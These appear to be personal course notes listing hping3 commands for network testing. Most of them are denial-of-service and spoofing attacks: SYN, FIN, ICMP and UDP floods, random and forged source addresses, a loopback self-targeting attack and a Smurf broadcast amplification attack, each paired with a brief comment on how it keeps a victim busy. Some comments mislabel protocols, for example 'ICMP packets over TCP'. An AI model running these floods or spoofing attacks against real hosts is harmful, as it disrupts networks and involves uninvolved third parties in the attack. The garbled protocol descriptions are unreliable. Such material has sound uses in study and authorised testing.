    commands:
        hping3
            hping3 <TARGET IP>
                normal ICMP packet
            hping3 -p 100 <TARGET IP>
                sending an ICMP packet on port 100
            hping3 -S -p 100 <TARGET IP>
                sending a SYN packet on port 100
            hping3 -F -p 100 <TARGET IP>
                sending a FIN packet on port 100
            hping3 --flood -F -p 100 <TARGET IP>
                flooding target with the FIN attack!
            hping3 <-1|--icmp> --flood <TARGET IP>
                flooding target with ICMP packets over TCP
            hping3 <-2|--udp> --flood <TARGET IP>
                flooding target with ICMP packets over UDP
            hping3 --rand-source -p 100 <TARGET IP>
                sending an ICMP packet by random fake SRC IP addresses
            hping3 -S --spoof <FAKE IP> -p 100 <TARGET IP>
                spoofing an IP address by sending SYN packets from a fake IP address
                spoof attribute is for allowing program to make a packet with the SRC of someone else!
            hping3 --icmp --spoof <FAKE IP> <TARGET IP>
                spoofing an IP address by sending ICMP packets from a fake IP address. target can't send back an answer because there aren't any machines!
            hping3 --icmp --spoof <VICTIM IP> <SAME IP>
                to make a loop in the target system to send him back the answer and make him busy as we said in the last video :D
            hping3 --icmp --spoof <VICTIM IP> <BROADCAST IP>
                SMURF attack:
                    as we talked about sending a BROADCAST packet to the network, everyone tries to send back a REPLY to the victim IP and it should process all of them. so it goes busy ;)
        tcpdump
            tcpdump <-p|port> 100
                listening on port 100
    all above commands can cause block your physical Port if port-security is enabled!
